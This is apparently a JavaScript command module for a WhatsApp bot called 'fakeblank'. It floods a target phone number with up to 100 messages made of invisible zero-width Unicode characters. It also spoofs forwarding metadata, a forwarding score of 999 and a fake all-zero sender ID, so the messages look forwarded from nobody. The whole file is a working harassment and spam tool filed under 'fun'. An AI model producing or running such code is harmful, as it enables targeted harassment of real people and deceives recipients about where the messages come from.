const BLANK_PAYLOAD = '\u00AD\u200B\u200C\u200D\u2060\uFEFF\u034F\u200E\u200F'.repeat(20);

function normalizePhone(raw) {
  return raw.replace(/\D/g, '');
}

const GHOST_JID = '0000000000@s.whatsapp.net';

export default {
  name: 'fakeblank',
  alias: ['blanktext', 'fakemsg', 'blankmsg'],
  description: 'Flood a target with blank messages. Usage: .fakeblank <phone> [amount]',
  category: 'fun',

  async execute(sock, m, args, PREFIX) {
    const senderJid = m.key.remoteJid;

    if (!args[0]) {
      return sock.sendMessage(senderJid, {
        text: `❌ Usage: ${PREFIX}fakeblank <phone> [amount]\n\n` +
              `Example: ${PREFIX}fakeblank 254703397679 50`
      }, { quoted: m });
    }

    const phone  = normalizePhone(args[0]);
    const amount = Math.min(100, Math.max(1, parseInt(args[1]) || 10));
    const target = `${phone}@s.whatsapp.net`;

    const msgOptions = {
      contextInfo: {
        forwardingScore : 999,
        isForwarded     : true,
        remoteJid       : GHOST_JID,
        participant     : GHOST_JID,
        fromMe          : false
      }
    };

    try {
      await sock.sendMessage(senderJid, { react: { text: '⬜', key: m.key } });

      await sock.sendMessage(senderJid, {
        text: `⏳ Sending ${amount} blank messages to +${phone}...`
      }, { quoted: m });

      for (let i = 0; i < amount; i++) {
        await sock.sendMessage(target, { text: BLANK_PAYLOAD }, msgOptions);
        await new Promise(r => setTimeout(r, 120));
      }

      await sock.sendMessage(senderJid, {
        text: `✅ Done! Sent ${amount} blank messages to +${phone}`
      }, { quoted: m });

    } catch (err) {
      await sock.sendMessage(senderJid, {
        text: `❌ Failed: ${err.message}`
      }, { quoted: m });
    }
  }
};
